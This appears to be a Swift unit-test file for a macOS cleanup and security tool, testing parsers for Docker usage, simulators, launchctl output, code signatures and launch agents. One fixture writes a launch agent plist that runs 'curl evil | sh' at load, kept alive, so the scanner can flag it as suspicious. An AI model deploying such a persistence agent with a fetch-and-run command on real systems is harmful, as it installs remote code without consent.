import Foundation
import Testing
@testable import LustroKit

struct ParsingTests {
    @Test(arguments: [("1.204GB (50%)", Int64(1_204_000_000)), ("512MB", 512_000_000), ("0B", 0), ("12.5kB (3%)", 12_500), ("garbage", 0)])
    func dockerSizes(text: String, bytes: Int64) {
        #expect(DockerCleaner.parseSize(text) == bytes)
    }

    @Test func dockerUsageRows() {
        let output = """
        {"Active":"2","Reclaimable":"1.5GB (60%)","Size":"2.5GB","TotalCount":"5","Type":"Images"}
        {"Active":"0","Reclaimable":"0B","Size":"0B","TotalCount":"0","Type":"Containers"}
        {"Active":"0","Reclaimable":"300MB","Size":"300MB","TotalCount":"12","Type":"Build Cache"}
        """
        let rows = DockerCleaner.parseUsage(output)
        #expect(rows == [
            .init(type: "Imagens", reclaimable: 1_500_000_000),
            .init(type: "Containers", reclaimable: 0),
            .init(type: "Cache de build", reclaimable: 300_000_000),
        ])
    }

    @Test func unavailableSimulators() {
        let json = """
        {"devices":{"com.apple.CoreSimulator.SimRuntime.iOS-17-0":[
          {"udid":"AAA","isAvailable":false,"name":"iPhone 15"},
          {"udid":"BBB","isAvailable":false,"name":"iPad"}
        ],"com.apple.CoreSimulator.SimRuntime.iOS-26-0":[]}}
        """
        #expect(Set(SimulatorCleaner.parseUnavailable(json)) == ["AAA", "BBB"])
        #expect(SimulatorCleaner.parseUnavailable("not json").isEmpty)
    }

    @Test func launchctlServices() {
        let output = """
        gui/501 = {
        \ttype = login
        \tservices = {
        \t\t       0      0 \tKubofood
        \t\t     666      - \tcom.apple.syncdefaultsd
        \t}
        \tother = 1
        }
        """
        #expect(LaunchItemScanner.parseServices(output) == ["Kubofood", "com.apple.syncdefaultsd"])
    }

    @Test func launchctlDisabled() {
        let output = """
        disabled services = {
        \t"com.example.updater" => disabled
        \t"com.example.helper" => enabled
        \t"com.legacy.agent" => true
        }
        """
        #expect(LaunchControl.parseDisabled(output) == ["com.example.updater", "com.legacy.agent"])
    }

    @Test func launchItemPlist() throws {
        let sandbox = try Sandbox()
        let plist = sandbox.url("agent.plist")
        let contents: [String: Any] = [
            "Label": "com.example.agent",
            "ProgramArguments": ["/bin/sh", "-c", "curl evil | sh"],
            "RunAtLoad": true,
            "KeepAlive": ["SuccessfulExit": false],
        ]
        try PropertyListSerialization.data(fromPropertyList: contents, format: .xml, options: 0).write(to: plist)

        let item = try #require(LaunchItemScanner.parse(plist, scope: .user, loaded: ["com.example.agent"], disabled: []))
        #expect(item.runsAtLoad)
        #expect(item.keepsAlive)
        #expect(item.isLoaded)
        #expect(!item.isDisabled)
        #expect(item.signature == .script)
        #expect(item.signature.isSuspicious)
    }

    @Test func missingProgramIsReported() throws {
        #expect(CodeSignature.status(of: URL(filePath: "/nonexistent/tool")) == .missing)
        #expect(CodeSignature.status(of: URL(filePath: "/bin/ls")) == .apple)
    }

    @Test(arguments: [
        ("Developer ID Application: Docker Inc (9BNSXJN65R)", "Docker Inc"),
        ("Apple Development: Someone (ABC)", "Someone"),
        ("", "TEAM"),
    ])
    func signerNames(summary: String, expected: String) {
        #expect(CodeSignature.cleanSigner(summary, team: "TEAM") == expected)
    }
}

struct ProcessNamingTests {
    @Test(arguments: [
        ("/Users/me/.local/share/claude/versions/2.1.308", "claude"),
        ("/opt/homebrew/Cellar/node/22.1.0/bin/node", "node"),
        ("/usr/libexec/trustd", "trustd"),
    ])
    func versionedToolsGetTheirRealName(path: String, expected: String) {
        #expect(ProcessSampler.readableName(for: URL(filePath: path)) == expected)
    }
}

struct PackageManagerTrustTests {
    @Test(arguments: [
        ("/opt/homebrew/opt/postgresql@16/bin/postgres", "Homebrew"),
        ("/Users/me/Library/pnpm/pnpm", "pnpm"),
        ("/Users/me/Library/Application Support/Evil/agent", nil),
        ("/opt/homebrew-fake/agent", nil),
    ] as [(String, String?)])
    func servicesFromPackageManagersAreRecognized(path: String, manager: String?) {
        #expect(CodeSignature.packageManager(for: path, home: "/Users/me") == manager)
    }
}
